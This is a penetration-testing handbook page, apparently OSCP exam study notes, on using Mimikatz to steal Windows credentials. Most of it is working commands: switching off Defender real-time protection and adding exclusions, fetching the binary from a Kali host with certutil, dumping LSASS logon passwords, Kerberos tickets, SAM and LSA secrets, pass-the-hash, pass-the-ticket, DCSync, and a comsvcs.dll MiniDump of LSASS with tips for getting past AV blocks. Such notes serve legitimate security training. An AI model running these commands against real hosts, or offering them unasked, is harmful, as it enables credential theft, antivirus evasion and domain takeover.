---
title: "Mimikatz"
slug: mimikatz
category: notes
handbook: oscp
tags: ["credentials", "windows"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Mimikatz extracts secrets from a live Windows host: plaintext passwords, NT hashes, and Kerberos tickets held in memory by LSASS, plus the local SAM and LSA secrets."
---
Mimikatz extracts secrets from a live Windows host: plaintext passwords, NT hashes, and Kerberos tickets held in memory by LSASS, plus the local SAM and LSA secrets. It is the standard way to turn admin on one machine into another user's credentials, feeding [AD Lateral Movement](/collections/oscp/ad-lateral-movement) and [DCSync](/collections/oscp/dcsync). It runs on the target as a local administrator (most commands also need `SeDebugPrivilege`, which admin grants), and is a Windows executable transferred from Kali ([File Transfers](/collections/oscp/file-transfers)).

Antivirus flags the mimikatz binary hard; Defender deletes it on write. With admin or SYSTEM, the lab-simple fix is to disable real-time protection and exclude the working directory, then push the binary again:

```powershell
powershell -c "Add-MpPreference -ExclusionPath 'C:\Windows\Temp'; Set-MpPreference -DisableRealtimeMonitoring $true"
```

Tamper protection can silently revert the realtime toggle, often within a minute (confirm the current state with `Get-MpComputerStatus`), so the exclusion path is the part that reliably persists, and it is what lets a binary in that folder run. Behavioural blocks like the LSASS-dump protection are separate again, disabled by neither switch.

When disabling AV is off the table, the reliable alternative is not another way to touch LSASS, it is to stop touching it: [NetExec](/collections/oscp/netexec) pulls hashes remotely (`--sam`, `--lsa`, `--ntds`) with no binary on the target and no LSASS read at all. When the shell is SYSTEM with no credential in hand, the minting routes in [Windows Credential Hunting](/collections/oscp/windows-credential-hunting#from-system-shell-to-remote-dump) (promote a known-password account, or hive dump for the RID 500 hash) produce the credential that unlocks that remote route. The minidump route below still reads LSASS, so it trips the same behavioural rule that a live mimikatz does.

## Get it onto the target

Download on Kali, then transfer like any other tool ([File Transfers](/collections/oscp/file-transfers)):

```bash
# Kali: fetch, unzip, serve
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip -o mimikatz_trunk.zip -d mimikatz      # x64/mimikatz.exe is the build to use
sudo python3 -m http.server 80
```

```cmd
:: target, cmd (admin shell)
certutil -urlcache -split -f http://KALI/mimikatz.exe C:\Windows\Temp\mimikatz.exe
```

An SMB share (`impacket-smbserver share . -smb2support`) works too. If AV quarantines the binary, use the offline route below instead.

## Run through a remote shell

Enable debug first (it allows reading another process's memory), then pass the commands as arguments so it never stops at the interactive `mimikatz #` prompt:

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Through impacket-psexec or wmiexec there is a catch: mimikatz writes to the console, which corrupts the named pipe those tools use for I/O, so the shell dies straight after with `The process tried to write to a nonexistent pipe`. The output still prints before it breaks, but the reliable full cycle is to redirect mimikatz to a file and pull that back, which keeps the shell alive and never risks losing the dump:

```cmd
:: in the shell: run to a file instead of the console
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > C:\Windows\Temp\mimi.txt 2>&1
```

```bash
# from Kali: read the result back over SMB
nxc smb TARGET -u Administrator -H <hash> --get-file '\Windows\Temp\mimi.txt' mimi.txt
```

`type C:\Windows\Temp\mimi.txt` in the shell works too when the pull is not needed.

## Dump credentials from memory

```
sekurlsa::logonpasswords           # NT hashes (and plaintext on older/misconfigured hosts) of everyone logged on
sekurlsa::tickets /export          # Kerberos tickets of logged-on users, saved as .kirbi
```

`sekurlsa::logonpasswords` is the headline: an admin shell on a shared host returns the cached credentials of every active session, including any privileged account logged in there.

## Local databases

```
lsadump::sam                       # local account NT hashes (same data as reg save SAM)
lsadump::lsa /patch                # LSA secrets: service passwords, cached domain logons
```

## Reuse without cracking

```
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<hash> /run:cmd.exe   # pass-the-hash, new process as that user
lsadump::dcsync /domain:corp.com /user:krbtgt                                  # DCSync from Windows (needs DA/replication), see [DCSync](/collections/oscp/dcsync)
kerberos::ptt ticket.kirbi                                                     # inject a ticket (pass-the-ticket)
```

## Offline alternative: minidump and parse on Kali

This avoids putting the flagged **binary** on disk, which is a different problem from avoiding AV. `comsvcs.dll MiniDump` is itself one of the most heavily signatured LSASS techniques in existence, so it is the answer to "I cannot drop mimikatz here", not to "Defender is on". Expect it to fail on any host with a current Defender.

`MiniDump` takes the LSASS process ID, so look it up first (the PID is the number in the second column; `Get-Process lsass` does the same from PowerShell). It also needs `SeDebugPrivilege` actually enabled in the token, which a SYSTEM shell has and a plain elevated cmd often does not:

```cmd
:: on target (admin): find the LSASS PID, then minidump it with the built-in comsvcs.dll
tasklist /fi "imagename eq lsass.exe"
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\lsass.dmp full
```

```bash
# on Kali: extract the same secrets from the dump
pypykatz lsa minidump lsass.dmp
```

Task Manager (right-click `lsass.exe` -> Create dump file) and `procdump -ma lsass.exe` produce the same dump file.

A 0-byte `lsass.dmp`, which pypykatz then rejects with `MinidumpHeaderSignatureMismatchException`, means Defender blocked the dump before any data was written. The behavioural rule that stops it (ASR "Block credential stealing from lsass.exe", plus the LSASS-access engine) is **not** disabled by `DisableRealtimeMonitoring`, which only covers file scanning, so the empty file appears even after the realtime toggle above. When it comes back empty: fully disable Defender and run mimikatz directly if that is an option, pull hashes remotely with [NetExec](/collections/oscp/netexec) instead (no LSASS read at all), or reach for a less-signatured dumper.
